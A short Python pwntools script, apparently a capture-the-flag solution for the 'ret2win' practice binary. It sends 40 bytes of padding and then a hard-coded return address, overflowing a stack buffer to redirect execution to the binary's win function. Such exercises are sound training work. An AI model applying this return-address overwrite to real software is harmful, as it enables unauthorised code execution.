from pwn import *
elf = context.binary = ELF("./ret2win")
io = process("./ret2win")

io.recv()

offset=b"A"*40
ret2win= p64(0x00400756)

io.sendline(offset+ret2win)

io.success(io.recvall())
